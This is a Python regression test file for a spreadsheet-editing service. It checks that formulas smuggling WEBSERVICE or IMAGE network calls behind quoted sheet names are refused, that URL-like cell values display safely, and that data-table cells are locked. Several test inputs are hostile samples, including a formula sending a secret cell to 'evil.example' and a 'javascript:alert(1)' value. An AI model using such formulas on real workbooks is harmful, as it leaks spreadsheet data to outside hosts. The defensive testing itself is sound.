"""Regression tests for the URI-OFFICE-M1 review round 3 findings R3-01, R3-02 and R3-04 (each failed before its
repair). R3-03 (rich-text grid edits) is covered by uri_ui/office_web/test/convert.test.mjs and edits.univer.test.mjs."""
import json
import zipfile

import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.worksheet.formula import DataTableFormula

from uri_a2ui import catalog as C
from uri_office import approvals as A
from uri_office import ops as O
from uri_office import xlsx_patch as XP
from uri_office.errors import OfficeError
from uri_office.service import Office


def _act(prop, button="apply", name="office.apply_change"):
    m = prop["messages"]
    model = m[2]["updateDataModel"]["value"]
    return {"name": name, "surfaceId": m[0]["createSurface"]["surfaceId"], "sourceComponentId": button,
            "context": {"surface_digest": model["bound"]["surface"]["digest"],
                        "change_sha256": model["bound"]["change_sha256"]}}


def _texts(prop) -> list:
    comps = [c for msg in prop["messages"] for c in (msg.get("updateComponents") or {}).get("components", [])]
    return [c["text"] for c in comps if c.get("component") == "Text"]


@pytest.fixture
def office(tmp_path, rich):
    o = Office(tmp_path / "state", allowed_roots=[tmp_path])
    return o, o.open_local(str(rich))["workbook_id"]


# ---- R3-01: a quote inside a quoted sheet name cannot hide a network call -------------------------------------------
@pytest.mark.parametrize("f", [
    "='q\"'!A1&WEBSERVICE(\"http://e/\"&B1)&'q\"'!A1",
    "='a\"b'!A1&IMAGE(\"u\")&'c\"d'!A1",
    "='it''s\"'!A1&WEBSERVICE(A2)&'x\"'!A1",
    "='q\"'!A1&AI(\"x\")&'q\"'!A1",
    "=\"a'\"&WEBSERVICE(A1)&\"'b\"",
])
def test_quote_in_sheet_name_cannot_hide_network_call(f):
    with pytest.raises(OfficeError) as e:
        O.check_formula(f)
    assert e.value.code == "FORMULA_REFUSED"


@pytest.mark.parametrize("f", ["=\"abc", "='Sales!A1", "='q\"'!A1&\"x", "=\"a\"\"", "='it''s!A1"])
def test_unterminated_quote_refused(f):
    with pytest.raises(OfficeError) as e:
        O.check_formula(f)
    assert e.value.code == "BAD_FORMULA"


@pytest.mark.parametrize("f", [
    "='My Sheet'!A1", "='it''s'!A1+1", "='q\"'!A1*2", '=IF(A1="IMAGE",1,0)', '="a""IMAGE"&\'it\'\'s\'!A1',
    "='WEBSERVICE'!A1", '=CONCAT("WEBSERVICE(",A1,")")'])
def test_quoted_names_and_strings_still_accepted(f):
    assert O.check_formula(f) == f


@pytest.fixture
def quote_book(tmp_path):
    wb = Workbook()
    wb.active.title = "Data"
    wb.active["A1"] = "secret"
    wb.create_sheet('q"')["A1"] = 1
    p = tmp_path / "quote.xlsx"
    wb.save(p)
    return p


def test_quote_sheet_bypass_refused_end_to_end(tmp_path, quote_book):
    o = Office(tmp_path / "state", allowed_roots=[tmp_path])
    wid = o.open_local(str(quote_book))["workbook_id"]
    f = "='q\"'!A1&WEBSERVICE(\"ht\"&\"tp:\"&\"//evil\"&\".example/?\"&Data!A1)&'q\"'!A1"
    with pytest.raises(OfficeError) as e:
        o.edit(wid, {"sheet": "Data", "cell": "B1", "formula": f})
    assert e.value.code == "FORMULA_REFUSED"
    with pytest.raises(OfficeError) as e:                       # nothing was drafted, so there is nothing to save
        o.propose_save(wid, {})
    assert e.value.code == "NOTHING_TO_SAVE"
    o.edit(wid, {"sheet": "Data", "cell": "B1", "formula": "='q\"'!A1*2"})   # a plain reference to that sheet still works
    o.action(_act(o.propose_save(wid, {})))
    with zipfile.ZipFile(quote_book) as z:
        assert "WEBSERVICE" not in z.read("xl/worksheets/sheet1.xml").decode()
    assert load_workbook(quote_book)["Data"]["B1"].value == "='q\"'!A1*2"


# ---- R3-02: a value with a URL in it can be shown on the card and saved ----------------------------------------------
@pytest.mark.parametrize("value", ["see https://example.com", "javascript:alert(1)", "FILE://x/y", "data:text/html,x",
                                   "12:30 and http://a.b/c?d=e:f"])
def test_url_valued_cell_can_be_proposed_and_saved(office, rich, value):
    o, wid = office
    o.edit(wid, {"sheet": "Sales", "cell": "A2", "value": value})
    prop = o.propose_save(wid, {})
    line = next(t for t in _texts(prop) if t.startswith("Sales!A2: "))
    shown = line.split(" -> ", 1)[1]
    assert json.loads(shown) == value                           # the card still shows the exact value
    assert ":" not in shown
    assert o.action(_act(prop))["status"] == "applied"
    assert load_workbook(rich)["Sales"]["A2"].value == value


def test_url_in_formula_text_can_be_proposed(office):
    o, wid = office
    o.edit(wid, {"sheet": "Sales", "cell": "F1", "formula": '="see https://example.com"'})
    line = next(t for t in _texts(o.propose_save(wid, {})) if t.startswith("Sales!F1: "))
    assert json.loads(line.split(" -> ", 1)[1]) == '="see https://example.com"'


def test_url_exposed_by_a_split_line_is_still_shown(office):
    o, wid = office
    prefix = 'Sales!J1: (empty) -> "'
    value = "x" * (C.MAX_STRING - len(prefix)) + "data:y"      # no link as a whole; the split exposes "data:y"
    o.edit(wid, {"sheet": "Sales", "cell": "J1", "value": value})
    texts = _texts(o.propose_save(wid, {}))
    joined = "".join(t.removeprefix(A.CONTINUED) for t in texts if t.startswith(("Sales!J1", A.CONTINUED)))
    assert json.loads(joined.split(" -> ", 1)[1]) == value


def test_card_that_cannot_be_shown_is_an_office_error(tmp_path):
    ap = A.Approvals(tmp_path, "owner")
    with pytest.raises(OfficeError) as e:
        ap.propose("w", {"kind": "local", "label": "/home/u/javascript:x/b.xlsx"},
                   {"edits": [{"sheet": "S", "cell": "A1", "before": None, "after": {"v": 1}}], "struct_ops": []})
    assert e.value.code == "CHANGE_CANNOT_BE_SHOWN"


# ---- R3-04: data-table formulas are locked like array formulas ------------------------------------------------------
@pytest.fixture
def table_book(tmp_path):
    wb = Workbook()
    ws = wb.active
    ws.title = "S"
    ws["A1"] = 1
    ws["D10"] = DataTableFormula("D10:E12", r1="A1")
    for r in (10, 11, 12):
        for c in "DE":
            if f"{c}{r}" != "D10":
                ws[f"{c}{r}"] = r
    p = tmp_path / "datatable.xlsx"
    wb.save(p)
    with zipfile.ZipFile(p) as z:
        assert 't="dataTable"' in z.read("xl/worksheets/sheet1.xml").decode()
    return p


def test_data_table_range_is_locked(table_book):
    assert {"D10", "D11", "D12", "E10", "E11", "E12"} <= set(XP.locked_cells(table_book)["S"])


@pytest.mark.parametrize("cell", ["D10", "D11", "E11", "E12"])
def test_data_table_cells_refused_at_save(table_book, tmp_path, cell):
    dst = tmp_path / "out.xlsx"
    with pytest.raises(OfficeError) as e:
        XP.patch(table_book, dst, [{"sheet": "S", "cell": cell, "value": 99}])
    assert e.value.code == "CELL_NOT_EDITABLE"
    assert not dst.exists()


def test_data_table_cells_refused_by_service(tmp_path, table_book):
    o = Office(tmp_path / "state", allowed_roots=[tmp_path])
    wid = o.open_local(str(table_book))["workbook_id"]
    for cell in ("D10", "E11"):
        with pytest.raises(OfficeError) as e:
            o.edit(wid, {"sheet": "S", "cell": cell, "value": 99})
        assert e.value.code == "CELL_NOT_EDITABLE"
